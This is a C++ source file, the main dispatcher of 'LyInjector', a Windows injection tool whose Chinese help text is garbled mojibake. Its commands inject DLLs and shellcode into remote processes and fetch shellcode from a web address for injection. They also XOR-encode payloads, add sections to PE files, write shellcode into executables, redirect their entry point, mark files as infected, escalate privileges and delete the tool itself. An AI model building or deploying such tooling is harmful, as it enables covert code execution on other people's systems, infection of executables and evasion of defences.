// LyInjector.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <shlobj.h>
#include <tchar.h>
#include <WinInet.h>
#include <Psapi.h>
#include <ImageHlp.h>
#include <stddef.h>
#pragma comment(lib,"Imagehlp.lib")
#pragma comment(lib, "WinInet.lib")

int _tmain(int argc, _TCHAR* argv[])
{
	if (argc == 1)
	{
		fprintf(stderr,
			" _            ___        _           _             \n"
			"| |   _   _  |_ _|_ __  (_) ___  ___| |_ ___  _ __ \n"
			"| |  | | | |  | || '_ \\ | |/ _ \\/ __| __/ _ \\| '__|\n"
			"| |__| |_| |  | || | | || |  __/ (__| || (_) | |   \n"
			"|_____\\__, | |___|_| |_|/ |\\___|\\___|\\__\\___/|_|   \n"
			"      |___/           |__/                         \n\n"
			"---------------------------------------------------------- \n"
			"[*] Ӧ�ò�������ע���� \n"
			"[+] �汾: 2.0.0 \n"
			"[+] ��ϵ����: me@lyshark.com \n"
			"---------------------------------------------------------- \n\n"
			"  [+] ��������\n\n"
			"\t Show              ��ʾ��ǰ���п�ע����� \n"
			"\t ShowDll           ��ʾ�����ڵ�����DLLģ�� \n"
			"\t Promote           ���������������Ȩ�� \n"
			"\t FreeDll           ����ж��ָ�������ڵ�DLLģ�� \n"
			"\t GetFuncAddr       ��ʾ�������ض�ģ���ں�����ַ \n"
			"\t Delself           ��ϵͳ��ɾ������ۼ� \n\n"
			"  [+] ��ʽ������\n\n"
			"\t Format            ���ֽ������ʽ��Ϊһ�в���ӡ \n"
			"\t FormatFile        ���ֽ������ʽ����д�����ļ� \n"
			"\t Xor               ���ı���ѹ������ֽ�������������� \n"
			"\t Xchg              ��ѹ������ַ���תΪ�ֽ������ʽ \n"
			"\t XorArray          ���ֽ��������/����Ϊ�ֽ������ʽ \n\n"
			"  [+] ����ע�빦��\n\n"
			"\t InjectDLL         ע��DLLģ�鵽�ض������� \n"
			"\t InjectSelfShell   ע���ַ�����������̲����� \n"
			"\t InjectArrayByte   ע���ֽ����鵽������̲����� \n"
			"\t FileInjectShell   ���ļ��ж����ַ�����ע������ \n"
			"\t InjectProcShell   ע���ַ�����Զ�̽��̲����� \n"
			"\t InjectWebShell    ��Զ�̼����ַ�����ע��������� \n"
			"\t AddSection        ��PE�ļ�������һ������ \n"
			"\t InsertShellCode   ��ShellCode���뵽PE�е�ָ��λ�ô� \n"
			"\t RepairShellOep    ��ShellCodeĩβ������ת��ԭ����ָ�� \n"
			"\t SetSigFlag        �����ļ���Ⱦ��־ \n\n"
			"  [+] ������\n\n"
			"\t EncodeInFile      ���ļ���������ַ�����ִ�з��� \n"
			"\t EncodePidInFile   ע����ܺ���ַ�����Զ�̽����� \n\n"
			);
	}
	if (argc == 2)
	{
		if (strcmp(argv[1], "Show") == 0)
		{
			ShellCodeInjectModule::EnumProcess();
		}
		if (strcmp(argv[1], "Promote") == 0)
		{
			if (ShellCodeInjectModule::IncreaseSelfAuthority() == FALSE)
			{
				printf("[-] Ȩ������ʧ��. \n");
			}
			else
			{
				printf("[*] ������. \n");
			}
		}
		if (strcmp(argv[1], "Delself") == 0)
		{
			if (ShellCodeInjectModule::SelfDel() == TRUE)
			{
				printf("[*] ���������. \n");
			}
			else
			{
				printf("[-] ɾ��ʧ��. \n");
			}
		}
	}
	if (argc == 4)
	{
		if ((strcmp(argv[1], "Format") == 0) && (strcmp(argv[2], "--path") == 0))
		{
			ShellCodeInjectModule::Compressed(argv[3]);
		}
		if ((strcmp(argv[1], "InjectSelfShell") == 0) && (strcmp(argv[2], "--shellcode") == 0))
		{
			ShellCodeInjectModule::InjectSelfCode(argv[3]);
		}
		if ((strcmp(argv[1], "InjectArrayByte") == 0) && (strcmp(argv[2], "--path") == 0))
		{
			ShellCodeInjectModule::CompressedOnFormat(argv[3]);
		}
		if ((strcmp(argv[1], "FileInjectShell") == 0) && (strcmp(argv[2], "--path") == 0))
		{
			ShellCodeInjectModule::ReadShellCodeOnMemory(argv[3]);
		}
		if (strcmp((char*)argv[1], "ShowDll") == 0 && strcmp((char*)argv[2], "--proc") == 0)
		{
			DWORD pid = DllInjectModule::FindProcessID(argv[3]);
			if (pid != 0xFFFFFFFF)
			{
				printf("\n");
				DllInjectModule::ShowProcessDllName(pid);
			}
			else
			{
				printf("[+] ��ָ��һ���������еĽ��� \n");
				return 0;
			}
		}
		if (argc == 4)
		{
			if (strcmp((char*)argv[1], "SetSigFlag") == 0 && strcmp((char*)argv[2], "--path") == 0)
			{
				PEInjectModule::SetSigFlag(argv[3]);
			}
		}
	}
	if (argc == 6)
	{
		if ((strcmp(argv[1], "FormatFile") == 0) && (strcmp(argv[2], "--path") == 0) && (strcmp(argv[4], "--output") == 0))
		{
			ShellCodeInjectModule::CompressedToFile(argv[3], argv[5]);
		}
		if ((strcmp(argv[1], "Xor") == 0) && (strcmp(argv[2], "--path") == 0) && (strcmp(argv[4], "--passwd") == 0))
		{
			ShellCodeInjectModule::XorShellCode(argv[3], argv[5]);
		}
		if ((strcmp(argv[1], "Xchg") == 0) && (strcmp(argv[2], "--input") == 0) && (strcmp(argv[4], "--output") == 0))
		{
			ShellCodeInjectModule::XchgShellCode(argv[3], argv[5]);
		}
		if ((strcmp(argv[1], "XorArray") == 0) && (strcmp(argv[2], "--path") == 0) && (strcmp(argv[4], "--passwd") == 0))
		{
			ShellCodeInjectModule::XorEncodeDeCode(argv[3], argv[5]);
		}
		if ((strcmp(argv[1], "InjectProcShell") == 0) && (strcmp(argv[2], "--pid") == 0) && (strcmp(argv[4], "--shellcode") == 0))
		{
			ShellCodeInjectModule::InjectCode(atoi(argv[3]), argv[5]);
		}
		if ((strcmp(argv[1], "InjectWebShell") == 0) && (strcmp(argv[2], "--address") == 0) && (strcmp(argv[4], "--payload") == 0))
		{
			ShellCodeInjectModule::WebPageBounceShellCode(argv[3], argv[5]);
		}
		if ((strcmp(argv[1], "EncodeInFile") == 0) && (strcmp(argv[2], "--path") == 0) && (strcmp(argv[4], "--passwd") == 0))
		{
			ShellCodeInjectModule::ReadXorShellCodeOnMemory(argv[3], argv[5]);
		}
		if (strcmp((char*)argv[1], "InjectDLL") == 0 && strcmp((char*)argv[2], "--proc") == 0 && strcmp((char*)argv[4], "--dll") == 0)
		{
			DWORD pid = DllInjectModule::FindProcessID(argv[3]);
			if (pid != 0xFFFFFFFF)
			{
				BOOL flag = DllInjectModule::RemoteProcessInject(pid, argv[5]);
				if (flag == TRUE)
				{
					printf("[*] ģ�� [ %s ] �ѱ�ע�뵽 [ %d ] ���� \n", argv[5], pid);
				}
				else
				{
					printf("[-] ģ��ע��ʧ�� \n");
				}
			}
			else
			{
				printf("[+] ��ָ��һ���������еĽ��� \n");
				return 0;
			}
		}
		if (strcmp((char*)argv[1], "FreeDll") == 0 && strcmp((char*)argv[2], "--proc") == 0 && strcmp((char*)argv[4], "--dll") == 0)
		{
			DWORD pid = DllInjectModule::FindProcessID(argv[3]);
			if (pid != 0xFFFFFFFF)
			{
				printf("\n");
				BOOL ref = DllInjectModule::FreeProcessDll(pid, argv[5]);
				printf("[*] ģ��ж��״̬: %d \n", ref);
			}
			else
			{
				printf("[+] ��ָ��һ���������еĽ��� \n");
				return 0;
			}
		}
	}
	if (argc == 8)
	{
		if ((strcmp(argv[1], "EncodePidInFile") == 0) && (strcmp(argv[2], "--pid") == 0) && (strcmp(argv[4], "--path") == 0) && (strcmp(argv[6], "--passwd") == 0))
		{
			ShellCodeInjectModule::InjectXorCode(atoi(argv[3]), argv[5], argv[7]);
		}
		if (strcmp((char*)argv[1], "GetFuncAddr") == 0 && strcmp((char*)argv[2], "--proc") == 0 &&
			strcmp((char*)argv[4], "--dll") == 0 && strcmp((char*)argv[6], "--func") == 0
			)
		{
			DWORD pid = DllInjectModule::FindProcessID(argv[3]);
			if (pid != 0xFFFFFFFF)
			{
				printf("\n");
				DllInjectModule::GetProcessDllFunctionAddress(pid, argv[5], argv[7]);
			}
			else
			{
				printf("[+] ��ָ��һ���������еĽ��� \n");
				return 0;
			}
		}
		if (strcmp((char*)argv[1], "AddSection") == 0
			&& strcmp((char*)argv[2], "--path") == 0
			&& strcmp((char*)argv[4], "--section") == 0
			&& strcmp((char*)argv[6], "--size") == 0
			)
		{
			PEInjectModule::ImplantSection(argv[3], argv[5], atoi(argv[7]));
			Sleep(1000);
			PEInjectModule::AllocateSpace(argv[3], atoi(argv[7]));
		}
		if (strcmp((char*)argv[1], "InsertShellCode") == 0
			&& strcmp((char*)argv[2], "--path") == 0
			&& strcmp((char*)argv[4], "--shellcode") == 0
			&& strcmp((char*)argv[6], "--offset") == 0
			)
		{
			PEInjectModule::WritePEShellCode(argv[3], atoi(argv[7]), argv[5]);
		}
		if (strcmp((char*)argv[1], "RepairShellOep") == 0
			&& strcmp((char*)argv[2], "--path") == 0
			&& strcmp((char*)argv[4], "--start_offset") == 0
			&& strcmp((char*)argv[6], "--end_offset") == 0
			)
		{
			PEInjectModule::SetPeJmpHeader((char*)argv[3], atoi(argv[5]), atoi(argv[7]));
		}
	}
	return 0;
}